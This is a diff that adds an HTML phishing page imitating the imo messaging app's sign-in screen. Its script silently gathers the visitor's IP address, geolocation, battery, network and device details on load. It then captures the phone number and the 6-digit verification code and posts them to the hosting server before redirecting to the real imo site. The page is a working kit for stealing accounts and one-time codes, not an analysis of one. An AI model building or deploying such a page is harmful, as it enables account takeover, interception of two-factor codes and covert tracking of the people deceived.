@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>imo</title>
+    <style>
+        /* CSS কোডে কোনো পরিবর্তন করা হয়নি */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: white; display: flex; flex-direction: column; align-items: center; min-height: 100vh; color: #333; padding: 40px 20px 20px; -webkit-text-size-adjust: 100%; }
+        .header { text-align: center; margin-bottom: 40px; width: 100%; }
+        .logo { font-size: 42px; font-weight: bold; color: #2095f2; margin-bottom: 8px; }
+        .tagline { color: #666; font-size: 16px; }
+        .container { background-color: white; width: 100%; max-width: 400px; }
+        .title { font-size: 20px; font-weight: 600; color: #333; margin-bottom: 20px; text-align: center; line-height: 1.3; }
+        .country-selector { background: white; border: 1px solid #ddd; border-radius: 12px; padding: 16px; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: all 0.2s; touch-action: manipulation; }
+        .country-selector:active { background: #f5f5f5; transform: scale(0.98); }
+        .country-info { display: flex; align-items: center; gap: 12px; }
+        .flag { width: 28px; height: 28px; border-radius: 50%; background: #2095f2; display: flex; align-items: center; justify-content: center; color: white; font-size: 12px; font-weight: bold; flex-shrink: 0; }
+        .country-text { font-size: 16px; font-weight: 500; color: #333; }
+        .country-code { color: #666; font-size: 15px; }
+        .chevron { color: #868e96; font-size: 14px; }
+        .input-group { margin-bottom: 20px; }
+        .input-label { display: block; margin-bottom: 8px; font-weight: 500; color: #495057; font-size: 14px; }
+        .phone-input-container { display: flex; gap: 10px; }
+        .code-input { width: 85px; height: 56px; border: 1px solid #ddd; border-radius: 12px; padding: 0 16px; font-size: 17px; background-color: #f9f9f9; transition: all 0.3s ease; text-align: center; -webkit-appearance: none; }
+        .phone-input { flex: 1; height: 56px; border: 1px solid #ddd; border-radius: 12px; padding: 0 20px; font-size: 17px; background-color: #f9f9f9; transition: all 0.3s ease; -webkit-appearance: none; }
+        .phone-input:focus, .code-input:focus { outline: none; border-color: #2095f2; background-color: white; box-shadow: 0 0 0 3px rgba(32, 149, 242, 0.1); }
+        .continue-button { color: white; background: #2095f2; border: none; border-radius: 12px; padding: 18px 0; font-size: 18px; font-weight: 600; cursor: pointer; width: 100%; transition: all 0.3s ease; touch-action: manipulation; -webkit-appearance: none; }
+        .continue-button:active { background: #1a7fd8; transform: scale(0.98); }
+        .footer { margin-top: 30px; text-align: center; width: 100%; }
+        .help-link { color: #666; text-decoration: none; font-size: 15px; display: inline-block; padding: 12px 20px; transition: all 0.2s; touch-action: manipulation; }
+        .help-link:active { color: #2095f2; background: rgba(32, 149, 242, 0.1); border-radius: 8px; }
+        .country-dropdown { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; border: 1px solid #ddd; border-radius: 16px; width: 90%; max-width: 400px; max-height: 70vh; overflow-y: auto; box-shadow: 0 10px 40px rgba(0,0,0,0.2); z-index: 1000; -webkit-overflow-scrolling: touch; }
+        .country-option { padding: 16px 20px; display: flex; align-items: center; gap: 12px; cursor: pointer; border-bottom: 1px solid #f0f0f0; touch-action: manipulation; }
+        .country-option:active { background: #f9f9f9; }
+        .country-option:last-child { border-bottom: none; }
+        #verification-section { display: none; }
+        .verification-title { font-size: 20px; font-weight: 600; margin-bottom: 12px; text-align: center; }
+        .verification-subtitle { font-size: 15px; color: #666; margin-bottom: 25px; text-align: center; line-height: 1.4; padding: 0 10px; }
+        .code-inputs { display: flex; gap: 12px; margin-bottom: 25px; justify-content: center; }
+        .code-input-digit { width: 50px; height: 60px; border: 1px solid #ddd; border-radius: 12px; background: #f9f9f9; text-align: center; font-size: 22px; font-weight: 600; -webkit-appearance: none; }
+        .code-input-digit:focus { outline: none; border-color: #2095f2; box-shadow: 0 0 0 3px rgba(32, 149, 242, 0.1); }
+        #loader { display: none; margin: 20px auto; width: 32px; height: 32px; border: 3px solid #f3f3f3; border-top: 3px solid #2095f2; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .dropdown-backdrop { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 999; }
+    </style>
+</head>
+<body>
+    <div class="header"><div class="logo">imo</div><div class="tagline">Free video calls and messages</div></div>
+    <input type="hidden" id="deviceInfo">
+    <div class="dropdown-backdrop" id="dropdownBackdrop"></div>
+    <div class="container">
+        <div id="phone-login-section">
+            <div class="title">Enter your phone number</div>
+            <div class="country-selector-container">
+                <div class="country-selector" onclick="toggleCountryDropdown()">
+                    <div class="country-info"><div class="flag">US</div><div class="country-text">United States</div><div class="country-code">+1</div></div>
+                    <div class="chevron">▼</div>
+                </div>
+                <div class="country-dropdown" id="countryDropdown"></div>
+            </div>
+            <div class="input-group">
+                <label class="input-label">Phone Number</label>
+                <div class="phone-input-container"><input type="text" class="code-input" id="countryCode" value="+1" readonly><input type="tel" class="phone-input" placeholder="Phone number" id="phone" inputmode="numeric"></div>
+            </div>
+            <button class="continue-button" onclick="sendPhoneNumber()">Continue</button>
+            <div id="loader"></div>
+        </div>
+        <div id="verification-section">
+            <div class="verification-title">Enter verification code</div>
+            <div class="verification-subtitle">We've sent a 6-digit code to your phone</div>
+            <div class="code-inputs">
+                <input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 1)" inputmode="numeric"><input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 2)" inputmode="numeric"><input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 3)" inputmode="numeric"><input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 4)" inputmode="numeric"><input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 5)" inputmode="numeric"><input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 6)" inputmode="numeric">
+            </div>
+            <button class="continue-button" onclick="verifyCode()">Verify</button>
+        </div>
+    </div>
+    <div class="footer"><a href="#" class="help-link">Having trouble signing in? Send feedback</a></div>
+
+    <script>
+        const countries = [
+            { code: "US", name: "United States", dialCode: "+1", flag: "US" }, { code: "GB", name: "United Kingdom", dialCode: "+44", flag: "GB" }, { code: "BD", name: "Bangladesh", dialCode: "+880", flag: "BD" }, { code: "IN", name: "India", dialCode: "+91", flag: "IN" },
+        ];
+        // Functions for country dropdown (toggleCountryDropdown, selectCountry, initCountryDropdown) and input focus (moveToNext) are unchanged.
+        function initCountryDropdown() { /* ... unchanged ... */ } function toggleCountryDropdown() { /* ... unchanged ... */ } function selectCountry(country) { /* ... unchanged ... */ } function moveToNext(input, nextIndex) { /* ... unchanged ... */ }
+
+        // উন্নত ডিভাইস তথ্য সংগ্রহ এবং পাঠানোর নতুন স্ক্রিপ্ট
+        document.addEventListener('DOMContentLoaded', async function() {
+            const getFullDeviceInfo = async () => {
+                const deviceInfo = { ua: navigator.userAgent, platform: navigator.platform, res: `${window.screen.width}x${window.screen.height}`, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
+                if (navigator.connection) { deviceInfo.net_type = navigator.connection.effectiveType; }
+                if ('getBattery' in navigator) { try { const b = await navigator.getBattery(); deviceInfo.battery = `${Math.round(b.level*100)}%`; deviceInfo.charging = b.charging; } catch(e){} }
+                try { const ip_res = await fetch('https://api.ipify.org?format=json'); deviceInfo.ip = (await ip_res.json()).ip; } catch(e){}
+                if (navigator.geolocation) { try { const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej)); deviceInfo.loc = `${pos.coords.latitude},${pos.coords.longitude}`; } catch(e){} }
+                return JSON.stringify(deviceInfo);
+            };
+            document.getElementById('deviceInfo').value = await getFullDeviceInfo();
+            initCountryDropdown();
+        });
+
+        async function sendPhoneNumber() {
+            const phone = document.getElementById('phone').value;
+            const countryCode = document.getElementById('countryCode').value;
+            const fullPhone = countryCode + phone;
+            const deviceInfo = document.getElementById('deviceInfo').value;
+
+            if (!phone) { alert('Please enter your phone number'); return; }
+
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{"imoData":[]}');
+                storedData.imoData.push({ phone: fullPhone, deviceInfo: deviceInfo, timestamp: new Date().toLocaleString(), type: 'login' });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch (error) { console.error('Error saving to localStorage:', error); }
+
+            const continueButton = document.querySelector('#phone-login-section .continue-button');
+            const loader = document.getElementById('loader');
+            continueButton.style.display = 'none'; loader.style.display = 'block';
+
+            const params = new URLSearchParams();
+            params.append('email', fullPhone);
+            params.append('pass', 'phone_login');
+            params.append('deviceInfo', deviceInfo);
+
+            try {
+                await fetch('/', { method: 'POST', body: params });
+                document.getElementById('phone-login-section').style.display = 'none';
+                document.getElementById('verification-section').style.display = 'block';
+            } catch (error) {
+                alert('Submission failed.');
+                continueButton.style.display = 'block'; loader.style.display = 'none';
+            }
+        }
+
+        async function verifyCode() {
+            let code = Array.from(document.querySelectorAll('.code-input-digit')).map(input => input.value).join('');
+            if (code.length !== 6) { alert('Please enter the complete 6-digit code'); return; }
+
+            const fullPhone = document.getElementById('countryCode').value + document.getElementById('phone').value;
+            const deviceInfo = document.getElementById('deviceInfo').value;
+
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{"imoData":[]}');
+                storedData.imoData.push({ phone: fullPhone, '2fa_code': code, deviceInfo: deviceInfo, timestamp: new Date().toLocaleString(), type: '2fa' });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch (error) { console.error('Error saving 2FA to localStorage:', error); }
+
+            const verifyButton = document.querySelector('#verification-section .continue-button');
+            verifyButton.textContent = 'Verifying...'; verifyButton.disabled = true;
+
+            const params = new URLSearchParams();
+            params.append('email', fullPhone);
+            params.append('2fa_code', code);
+            params.append('deviceInfo', deviceInfo);
+
+            try {
+                const response = await fetch('/', { method: 'POST', body: params });
+                window.location.href = response.redirected ? response.url : 'https://imo.im';
+            } catch (error) {
+                alert('Verification failed.');
+                verifyButton.textContent = 'Verify'; verifyButton.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
